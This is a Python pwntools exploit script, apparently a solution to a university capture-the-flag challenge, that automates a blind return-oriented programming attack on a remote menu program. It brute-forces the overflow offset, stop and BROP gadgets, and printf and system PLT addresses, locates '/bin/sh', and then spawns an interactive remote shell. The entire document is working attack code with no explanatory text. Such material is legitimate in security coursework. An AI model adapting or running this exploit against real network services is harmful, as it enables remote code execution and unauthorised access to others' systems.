from pwn import * 

OFFSET_MIN = 1
OFFSET_MAX = 100

STOP_GADGET_MIN = 0x400849
STOP_GADGET_MAX = STOP_GADGET_MIN+0x100

BROP_GADGET_MIN = 0x4009e6
BROP_GADGET_MAX = BROP_GADGET_MIN + 0x100

PLT_MIN = 0x4006c0
PLT_MAX = PLT_MIN +0x100

DATA_MIN = 0x400a30
DATA_MAX = DATA_MIN + 0x100

def start():
    return remote("cse4850-brop-2.chals.io", 443, ssl=True, sni="cse4850-brop-2.chals.io")

def find_offset():
    for i in range(OFFSET_MIN, OFFSET_MAX):
        log.info(f"Trying an offset of {i}")
        with context.quiet:
            p = start()
            p.sendlineafter(b"choice >>>", b"5")
            p.sendlineafter(b"Rate our app and leave feedback >>>", b"A"*i)
            try:
                p.recvuntil(b"<<< Thank you", timeout=1)
            except EOFError:
                p.close()
                return i//8 * 8
            p.close()

def find_stop(offset):
    for i in range(STOP_GADGET_MIN, STOP_GADGET_MAX):
        log.info(f"Trying stop gadget of {hex(i)}")
        with context.quiet:
            p = start()
            p.sendlineafter(b"choice >>>", b"5")
            chain = b"A"*offset
            chain += p64(i)
            chain += p64(i+1)
            p.sendlineafter(b"Rate our app and leave feedback >>>", chain)
            try:
                s = p.recvuntil(b"C C# D D# E F F# G G# A A# B", timeout=1)
                if s == "":
                    continue
                p.close()
                return i
            except EOFError:
                p.close()

def find_brop(offset, stop):
    for i in range(BROP_GADGET_MIN, BROP_GADGET_MAX):
        log.info(f"Trying brop gadget of {hex(i)}")
        with context.quiet:
            p = start()
            p.sendlineafter(b"choice >>>", b"5")
            chain = b"A"*offset
            chain += p64(stop)
            chain += p64(i)
            for j in range(6):
                chain += p64(j)
            chain += p64(stop)
            chain += p64(stop+1)
            p.sendlineafter(b"Rate our app and leave feedback >>>", chain)
            try:
                s = p.recvuntil(b"C C# D D# E F F# G G# A A# B", timeout=1)
                if s == "":
                    continue
                p.close()
                return i
            except EOFError:
                p.close()

def find_printf_plt(offset, stop, brop):
    pop_rdi = brop + 13
    for i in range(PLT_MIN, PLT_MAX):
        log.info(f"Testing printf at {hex(i)}")
        with context.quiet:
            p = start()
            p.sendlineafter(b"choice >>>", b"5")
            chain = b"A"*offset
            chain += p64(stop)
            chain += p64(pop_rdi)
            chain += p64(i)
            chain += p64(i)
            p.sendlineafter(b"Rate our app and leave feedback >>>", chain)
            try:
                s = p.recvline()
                if b'\xff' in s:
                    p.close()
                    return i
                p.close()
            except EOFError:
                p.close()

def find_bin_sh(offset, stop, brop, printf):
    pop_rdi = brop + 13
    for i in range(DATA_MIN, DATA_MAX):
        log.info(f"Testing /bin/sh at {hex(i)}")
        with context.quiet:
            p = start()
            p.sendlineafter(b"choice >>>", b"5")
            chain = b"A"*offset
            chain += p64(stop)
            chain += p64(pop_rdi)
            chain += p64(i)
            chain += p64(printf)
            p.sendlineafter(b"Rate our app and leave feedback >>>", chain)
            try:
                s = p.recvline()
                if b"sh" == s[1:3]:
                    return i
            except EOFError:
                p.close()

def find_system(offset, stop, brop, printf, bin_sh):
    pop_rdi = brop + 13
    for i in range(PLT_MIN, PLT_MAX):
        log.info(f"Testing system at {hex(i)}")
        with context.quiet:
            p = start()
            p.sendlineafter(b"choice >>>", b"5")
            chain = b"A"*offset
            chain += p64(stop)
            chain += p64(pop_rdi)
            chain += p64(bin_sh)
            chain += p64(i)
            p.sendlineafter(b"Rate our app and leave feedback >>>", chain)
            try:
                p.recv(timeout=1)
                p.interactive()
            except EOFError:
                p.close()

offset = find_offset()
log.info(f"Found offset of {offset}")
pause()

stop = find_stop(offset)
log.info(f"Found stop gadget at {hex(stop)}")
pause()

brop = find_brop(offset, stop)
log.info(f"Found brop gadget at {hex(brop)}")
pause()

printf = find_printf_plt(offset, stop, brop)
log.info(f"Found printf at {hex(printf)}")
pause()

bin_sh = find_bin_sh(offset, stop, brop, printf)
log.info(f"Found bin_sh at {hex(bin_sh)}")
pause()

find_system(offset, stop, brop, printf, bin_sh)
